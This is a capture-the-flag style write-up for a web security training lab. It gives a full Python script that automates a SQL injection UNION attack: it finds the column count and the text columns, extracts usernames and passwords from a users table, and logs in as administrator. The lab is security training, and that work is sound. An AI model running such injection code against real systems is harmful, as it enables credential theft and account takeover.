# SQL injection UNION attack, retrieving data from other tables
>This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
The database contains a different table called `users`, with columns called `username` and `password`.

>To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# The base URL of the lab application
BASE_URL = "https://0a390038042489d485604acf0035001f.web-security-academy.net"
# The path with the SQL injection vulnerability
FILTER_PATH = "/filter"
# The path to the login page for the final verification
LOGIN_PATH = "/login"

# Construct full URLs
TARGET_URL = BASE_URL + FILTER_PATH
LOGIN_URL = BASE_URL + LOGIN_PATH

# Create a session to maintain cookies/state across requests
s = requests.Session()

def find_column_number(url):
    """
    Probes the application to find the correct number of columns
    in the original SQL query using ORDER BY or UNION NULL injection.
    """
    print("[-] Hunting for column count...")
    for i in range(1, 50):
        # Create a payload with 'i' number of NULLs
        null_list = ["NULL"] * i
        null_string = ",".join(null_list)
        
        # Inject the UNION SELECT payload
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        response = requests.get(url, params=payload)
        
        # If we get a 200 OK, the column count is correct
        if response.status_code == 200:
            print(f"[+] Found correct number of columns: {i}")
            return i
            
    print("[-] Column count not found.")
    return None

def find_text_columns(url, num_columns):
    """
    Identifies which columns in the query are compatible with text data types.
    Returns a list of valid column indices.
    """
    print("[-] Identifying text-compatible columns...")
    text_columns = []
    
    for i in range(num_columns):
        # Create a list of NULLs
        null_list = ["NULL"] * num_columns
        # Replace the current index with a string to test it
        null_list[i] = "'abc'"
        null_string = ", ".join(null_list)
        
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        response = requests.get(url, params=payload)
        
        if response.status_code == 200:
            text_columns.append(i)
            
    print(f"[+] Text columns found at indices: {text_columns}")
    return text_columns

def get_admin_password(url, num_columns, text_columns):
    """
    Exploits the union injection to retrieve the administrator's password
    from the 'users' table.
    """
    print("[-] Retrieving administrator password...")
    
    # Prepare the payload list with NULLs
    exploit_list = ["NULL"] * num_columns
    
    # Map 'username' and 'password' to the valid text columns found earlier
    # This makes the script dynamic and robust against schema changes
    exploit_list[text_columns[0]] = "username"
    exploit_list[text_columns[1]] = "password"
    
    # Join into a string
    exploit_string = ", ".join(exploit_list)
    
    # Construct the full injection payload with the FROM clause
    payload = {"category": f"' UNION SELECT {exploit_string} FROM users -- "}
    
    # Send the attack
    response = requests.get(url, params=payload)
    
    # Parse the response to extract the password
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 1. Find the username 'administrator'
    # 2. Go up to its parent tag (<th>)
    # 3. Find the next sibling tag (<td>) which holds the password
    # 4. Extract the text
    admin_password = soup.find(string="administrator").parent.find_next_sibling("td").text
    
    print(f"[+] Password extracted: {admin_password}")
    return admin_password

def login(url, password):
    """
    Logs in as administrator to verify the exploit.
    Handles CSRF token extraction automatically.
    """
    print("[-] Attempting to log in...")
    
    # Step 1: GET the login page to grab the CSRF token
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find("input", {"name": "csrf"})
    token_value = token_input['value']
    
    # Step 2: POST the credentials + CSRF token
    login_data = {
        "username": "administrator",
        "password": password,
        "csrf": token_value
    }
    
    response = s.post(url, data=login_data)
    return response.text

# --- Main Execution ---
if __name__ == "__main__":
    print(f"[*] Starting attack on {TARGET_URL}")
    
    # 1. Reconnaissance
    num_columns = find_column_number(TARGET_URL)
    
    if num_columns:
        # 2. Column Analysis
        text_columns = find_text_columns(TARGET_URL, num_columns)
        
        if len(text_columns) >= 2:
            # 3. Exploitation & Extraction
            password = get_admin_password(TARGET_URL, num_columns, text_columns)
            
            # 4. Verification (Login)
            result_page = login(LOGIN_URL, password)
            
            if "Log out" in result_page:
                print("[+] SUCCESS: Successfully logged in as administrator!")
            else:
                print("[-] FAILURE: Login attempt failed.")
        else:
            print("[-] Error: Not enough text columns found to extract data.")
    else:
        print("[-] Error: Could not determine column count.")
```
